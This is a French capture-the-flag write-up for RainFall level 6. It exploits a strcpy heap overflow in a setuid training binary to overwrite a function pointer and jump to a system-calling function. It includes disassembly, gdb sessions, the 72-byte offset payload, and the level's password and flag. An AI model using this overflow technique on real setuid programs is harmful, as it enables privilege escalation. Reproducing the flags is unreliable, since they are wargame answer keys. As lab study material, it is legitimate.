# LEVEL 6

### Reconnaissance

On se connecte au level6 avec le password : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

On trouve un binaire 

```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6  
level6@RainFall:~$ ls
level6                                                                                             
level6@RainFall:~$ file level6                                                                                     
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 aaaaaaaa
Nope
```

Le programme segfault sans argument, on le télécharge et on l'analyse avec r2:
```
[0x080483a0]> pdf@main
            ; DATA XREF from entry0 @ 0x80483b7                                     
┌ 88: int main (int32_t arg_ch);                                                                             
│           ; arg int32_t arg_ch @ ebp+0xc                                                                   
│           ; var char *src @ esp+0x4                                                                        
│           ; var void *var_ch @ esp+0x18                                                                    
│           ; var char *dest @ esp+0x1c                                                                      
│           0x0804847c      55             push ebp                                                          
│           0x0804847d      89e5           mov ebp, esp                                                      
│           0x0804847f      83e4f0         and esp, 0xfffffff0                                               
│           0x08048482      83ec20         sub esp, 0x20                                                                     
│           0x08048485      c70424400000.  mov dword [esp], 0x40       ; '@'                                                 
│                                                                      ; [0x40:4]=-1 ; 64 ; size_t size                      
│           0x0804848c      e8bffeffff     call sym.imp.malloc         ;  void *malloc(size_t size)                          
│           0x08048491      8944241c       mov dword [dest], eax                                                             
│           0x08048495      c70424040000.  mov dword [esp], 4          ; size_t size                                              
│           0x0804849c      e8affeffff     call sym.imp.malloc         ;  void *malloc(size_t size)                               
│           0x080484a1      89442418       mov dword [var_ch], eax                                                                  
│           0x080484a5      ba68840408     mov edx, sym.m              ; 0x8048468 ; "U\x89\xe5\x83\xec\x18\xc7\x04$\u0445\x04\b\xe8\xe6\xfe\xff\xff\xc9\xc3U\x89\xe5\x83\xe4\xf0\x83\xec \xc7\x04$@"                                                                                       
│           0x080484aa      8b442418       mov eax, dword [var_ch]                                                                      
│           0x080484ae      8910           mov dword [eax], edx                                                                            
│           0x080484b0      8b450c         mov eax, dword [arg_ch]                                                                           
│           0x080484b3      83c004         add eax, 4                                                                                         
│           0x080484b6      8b00           mov eax, dword [eax]                                                                                     
│           0x080484b8      89c2           mov edx, eax
│           0x080484ba      8b44241c       mov eax, dword [dest]
│           0x080484be      89542404       mov dword [src], edx        ; const char *src
│           0x080484c2      890424         mov dword [esp], eax        ; char *dest
│           0x080484c5      e876feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484ca      8b442418       mov eax, dword [var_ch]
│           0x080484ce      8b00           mov eax, dword [eax]
│           0x080484d0      ffd0           call eax
│           0x080484d2      c9             leave
└           0x080484d3      c3             ret
```

Le segfault se produit au moment du strcpy, il copy argv dans la dest qui est malloc au préalable de 0x40 (64).
Si il n'y a pas d'argument, il segfault. Etant donnée qu'il n'y a pas de vérification sur la longueur de la chaine, essayons de voir si on peux ecrire sur l'EIP:
```
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 100')
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 10')
Nope
level6@RainFall:~$ gdb level6 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A" * 100')
Starting program: /home/user/level6/level6 $(python -c 'print "A" * 100')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
On ecrase donc l'EIP avec nos "A". Nous avons donc a faire a un **buffer overflow**

On peux voir 2 autres fonctions:
```
$ nm level6 |grep T
[...]
08048468 T m
0804847c T main
08048454 T n
[...]
```

Et celle ci nous permet de récupérer le flag grace a la fonction system:
```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.
```

### Exploitation

Nous avons l'adresse de n : 0x08048454
Nous allons ecrire sur l'EIP avec cette adresse


Il faut 72 bytes pour écrire sur l'EIP

Pour trouver les 72 bytes, on peux utilisé des outils telle que <a href="https://github.com/Svenito/exploit-pattern">exploit-pattern</a>.

Nous avons aussi `pattern-create` dans `gdb-peda`.
```
level6@RainFall:~$ gdb level6 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A" * 72 + "BBBB"')
Starting program: /home/user/level6/level6 $(python -c 'print "A" * 72 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

On converti notre adresse de n:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x08048454)
'T\x84\x04\x08'
```

Et donc nous avons notre payload :
```
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "T\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Enjoy :)
